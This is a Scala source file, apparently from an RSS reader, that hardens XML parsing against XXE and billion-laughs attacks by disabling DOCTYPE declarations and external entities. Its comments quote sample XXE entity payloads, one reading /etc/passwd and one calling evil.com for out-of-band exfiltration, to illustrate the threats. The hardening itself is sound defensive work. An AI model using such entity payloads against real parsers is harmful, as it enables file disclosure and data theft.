package me.binwang.rss.parser

import javax.xml.parsers.SAXParserFactory
import scala.xml.{Elem, XML}
import java.io.InputStream

object SecureXml {
  def load(is: InputStream): Elem = {
    val factory = SAXParserFactory.newInstance()
    // Disallow DOCTYPE declarations entirely, preventing XXE injection and billion-laughs DoS attacks
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
    // Disable external general entities (e.g. <!ENTITY xxe SYSTEM "file:///etc/passwd">) to prevent file disclosure and SSRF
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
    // Disable external parameter entities (e.g. <!ENTITY % ext SYSTEM "http://evil.com/xxe">) to prevent out-of-band data exfiltration
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
    XML.withSAXParser(factory.newSAXParser()).load(is)
  }
}
